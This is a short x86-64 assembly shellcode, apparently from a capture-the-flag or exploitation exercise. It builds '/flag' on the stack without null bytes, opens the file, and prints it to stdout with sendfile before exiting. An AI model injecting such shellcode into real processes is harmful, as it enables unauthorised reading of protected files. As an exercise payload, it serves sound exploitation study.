.global _start
_start:
	.intel_syntax noprefix
	xor rbx, rbx
	mov ebx, 0x67616c66
	shl rbx, 8
	mov bl, 0x2f
	push rbx
	xor rax, rax    
	mov al, 2
	mov rdi, rsp
	xor rsi, rsi
	syscall
	
	xor rdi, rdi
	mov dil, 1
	mov rsi, rax
	xor rdx, rdx
	xor r10, r10
	mov r10w, 1000
	xor rax, rax
	mov al, 40
	syscall
	
	xor rax, rax
	mov al, 60
	syscall
	

